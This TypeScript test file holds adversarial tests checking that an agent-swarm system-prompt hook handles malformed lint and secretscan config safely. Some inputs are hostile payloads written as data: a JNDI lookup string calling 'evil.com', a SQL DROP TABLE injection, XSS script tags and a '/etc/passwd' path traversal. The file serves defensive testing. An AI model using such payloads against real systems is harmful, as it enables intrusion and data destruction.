/**
 * Adversarial tests for v6.2 system-enhancer config-hint logic:
 * - lint.enabled and secretscan.enabled config handling
 * Tests BOTH legacy path (scoring disabled) and scoring path (scoring enabled)
 * 
 * Attack vectors:
 * 1. Malformed config payloads (null, undefined)
 * 2. Type confusion (strings, numbers, objects where boolean expected)
 * 3. Boundary/oversized metadata
 * 4. Control characters in config values
 * 5. Null bytes
 * 6. Injection-like strings (attempting to escape hint format)
 */
import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { createSystemEnhancerHook } from '../../../src/hooks/system-enhancer';
import { resetSwarmState } from '../../../src/state';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

describe('ADVERSARIAL: v6.2 System Enhancer Config-Hint Security', () => {
	let tempDir: string;

	beforeEach(async () => {
		tempDir = await mkdtemp(join(tmpdir(), 'swarm-adv-test-'));
		resetSwarmState();
	});

	afterEach(async () => {
		try {
			await rm(tempDir, { recursive: true, force: true });
		} catch (error) {
			// Ignore cleanup errors
		}
	});

	/**
	 * Helper to create minimal .swarm directory with plan.md and context.md
	 */
	async function createSwarmFiles(): Promise<void> {
		const swarmDir = join(tempDir, '.swarm');
		await mkdir(swarmDir, { recursive: true });

		// Create minimal plan.md
		await writeFile(join(swarmDir, 'plan.md'), '# Plan\n');

		// Create minimal context.md
		await writeFile(join(swarmDir, 'context.md'), '# Context\n');
	}

	/**
	 * Helper to invoke the transform hook and return the output
	 */
	async function invokeHook(
		config: Parameters<typeof createSystemEnhancerHook>[0],
	): Promise<{ output: string[]; error?: unknown }> {
		try {
			const hooks = createSystemEnhancerHook(config, tempDir);
			const transform = hooks['experimental.chat.system.transform'] as (
				input: { sessionID?: string },
				output: { system: string[] },
			) => Promise<void>;

			const input = { sessionID: 'test-session' };
			const output = { system: ['Initial system prompt'] };

			await transform(input, output);

			return { output: output.system };
		} catch (error) {
			return { output: [], error };
		}
	}

	const defaultConfig = {
		max_iterations: 5,
		qa_retry_limit: 3,
		inject_phase_reminders: true,
	};

	// ============================================
	// ADVERSARIAL: Null/Undefined Config Handling
	// ============================================

	describe('ADVERSARIAL: Null/Undefined config payloads', () => {
		it('lint config is null → should NOT crash, no lint hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: null as any,
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Should not contain lint disabled hint
			const hasLintHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasLintHint).toBe(false);
		});

		it('secretscan config is null → should NOT crash, no secretscan hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				secretscan: null as any,
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Should not contain secretscan disabled hint
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Secretscan gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint config is undefined → should NOT crash, no lint hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: undefined,
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Should not contain lint disabled hint
			const hasLintHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasLintHint).toBe(false);
		});

		it('lint config is null + scoring enabled → should NOT crash (scoring)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: null as any,
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});

		it('secretscan config is null + scoring enabled → should NOT crash (scoring)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				secretscan: null as any,
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});
	});

	// ============================================
	// ADVERSARIAL: Type Confusion
	// ============================================

	describe('ADVERSARIAL: Type confusion (non-boolean enabled)', () => {
		it('lint.enabled is string "false" → should NOT inject hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: 'false' as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// String "false" is truthy, so hint should NOT be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled is number 0 → should NOT inject hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: 0 as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Number 0 is falsy but !== false, so hint should NOT be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled is number 1 → should NOT inject hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: 1 as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Number 1 is truthy, so hint should NOT be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled is object {} → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: {} as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash - object is truthy
			expect(result.error).toBeUndefined();

			// Hint should not be injected (object !== false)
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled is empty string → should NOT inject hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: '' as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Empty string is falsy but !== false, so hint should NOT be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled is NaN → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: NaN as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});

		it('lint.enabled is array [] → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: [] as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash - array is truthy
			expect(result.error).toBeUndefined();
		});

		it('secretscan.enabled is string "false" → should NOT inject hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				secretscan: {
					enabled: 'false' as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Secretscan gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled type confusion + scoring enabled → should NOT crash (scoring)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: 'false' as any,
					mode: 'check',
				},
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});
	});

	// ============================================
	// ADVERSARIAL: Boundary/Oversized Metadata
	// ============================================

	describe('ADVERSARIAL: Boundary/oversized metadata', () => {
		it('lint.mode is extremely long string → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const longString = 'x'.repeat(10000);

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: longString as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash despite huge string
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('lint.patterns is massive array → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const massiveArray = Array(10000).fill('**/*.ts');

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check',
					patterns: massiveArray as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash despite massive array
			expect(result.error).toBeUndefined();
		});

		it('lint.linter is huge string + scoring enabled → should NOT crash (scoring)', async () => {
			await createSwarmFiles();

			const hugeString = 'a'.repeat(50000);

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: hugeString as any,
				},
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});
	});

	// ============================================
	// ADVERSARIAL: Control Characters & Null Bytes
	// ============================================

	describe('ADVERSARIAL: Control characters and null bytes', () => {
		it('lint.mode contains null byte → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check\x00' as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('lint.mode contains tab character → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check\t' as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('lint.mode contains newline → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check\n' as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('secretscan.patterns contains null byte → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				secretscan: {
					enabled: false,
					patterns: ['**/*.env\x00'] as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});

		it('lint.mode contains control chars (0x01-0x1F) → should NOT crash (scoring)', async () => {
			await createSwarmFiles();

			// Include various control characters
			const controlChars = String.fromCharCode(...Array.from({ length: 31 }, (_, i) => i + 1));

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: controlChars as any,
				},
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});
	});

	// ============================================
	// ADVERSARIAL: Injection-like Strings
	// ============================================

	describe('ADVERSARIAL: Injection-like strings', () => {
		it('lint.linter tries to inject SWARM tag → should NOT create duplicate hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: '[INJECTED] check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Should have exactly ONE lint hint (not duplicated)
			const lintHints = result.output.filter((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(lintHints.length).toBe(1);
		});

		it('secretscan.exclude tries to inject SWARM tag → should NOT affect hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				secretscan: {
					enabled: false,
					exclude: ['[SWARM CONFIG] HACKED'] as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected correctly
			const hasCorrectHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Secretscan gate is DISABLED'),
			);
			expect(hasCorrectHint).toBe(true);

			// Should NOT have injected string as separate hint
			const hasInjected = result.output.some((s) =>
				s.includes('[SWARM CONFIG] HACKED'),
			);
			expect(hasInjected).toBe(false);
		});

		it('lint.patterns tries SQL injection pattern → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: "check'; DROP TABLE lint; --" as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('secretscan.patterns tries path traversal → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				secretscan: {
					enabled: false,
					patterns: ['../../etc/passwd'] as any,
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Secretscan gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('lint.linter tries template injection → should NOT create malformed hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: '${jndi:ldap://evil.com/a}',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should be well-formed
			const hasWellFormedHint = result.output.includes(
				'[SWARM CONFIG] Lint gate is DISABLED. Skip lint check/fix in QA sequence.',
			);
			expect(hasWellFormedHint).toBe(true);
		});

		it('Multiple injection attempts → should handle gracefully (scoring)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check" onclick="alert(1)' as any,
				},
				secretscan: {
					enabled: false,
					patterns: ['<script>alert(1)</script>'] as any,
				},
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Both hints should be present
			const hasLintHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			const hasSecretscanHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Secretscan gate is DISABLED'),
			);
			expect(hasLintHint).toBe(true);
			expect(hasSecretscanHint).toBe(true);
		});
	});

	// ============================================
	// ADVERSARIAL: Strict Boolean Check Bypass Attempts
	// ============================================

	describe('ADVERSARIAL: Strict boolean check bypass attempts', () => {
		it('lint.enabled is boolean literal false → should inject hint (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Hint should be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('lint.enabled is Boolean(false) object → should NOT inject hint (legacy)', async () => {
			await createSwarmFiles();

			// eslint-disable-next-line no-new-wrappers
			const config = {
				...defaultConfig,
				lint: {
					enabled: new Boolean(false) as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Boolean object is truthy, hint should NOT be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(false);
		});

		it('lint.enabled is Symbol(false) → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					// eslint-disable-next-line @typescript-eslint/no-explicit-any
					enabled: (Symbol(false) as any),
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash (Symbol is truthy)
			expect(result.error).toBeUndefined();
		});

		it('lint.enabled is function returning false → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: (() => false) as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash (function is truthy)
			expect(result.error).toBeUndefined();
		});

		it('lint.enabled is Promise false → should NOT crash (legacy)', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: Promise.resolve(false) as any,
					mode: 'check',
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash (Promise is truthy)
			expect(result.error).toBeUndefined();
		});
	});

	// ============================================
	// ADVERSARIAL: Combined Attack Vectors
	// ============================================

	describe('ADVERSARIAL: Combined attack vectors', () => {
		it('Both lint and secretscan null + scoring → should NOT crash', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: null as any,
				secretscan: null as any,
				context_budget: {
					enabled: true,
					scoring: { enabled: true },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});

		it('Corrupt lint config object with many keys → should NOT crash', async () => {
			await createSwarmFiles();

			const config = {
				...defaultConfig,
				lint: {
					enabled: false,
					mode: 'check',
					patterns: Array(1000).fill('**/*.ts'),
					exclude: Array(1000).fill('**/node_modules/**'),
					linter: 'auto',
					// Extra corrupt fields
					foo: null,
					bar: undefined,
					baz: {},
					qux: [],
					nested: { a: { b: { c: { d: 'deep' } } } },
				},
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();

			// Hint should still be injected
			const hasHint = result.output.some((s) =>
				s.includes('[SWARM CONFIG] Lint gate is DISABLED'),
			);
			expect(hasHint).toBe(true);
		});

		it('Recursive nested objects in config → should NOT crash', async () => {
			await createSwarmFiles();

			// Create a recursive object
			const recursive: any = { value: false };
			recursive.self = recursive;

			const config = {
				...defaultConfig,
				lint: recursive,
			} as unknown as Parameters<typeof createSystemEnhancerHook>[0];

			const result = await invokeHook(config);

			// Should not crash
			expect(result.error).toBeUndefined();
		});
	});
});
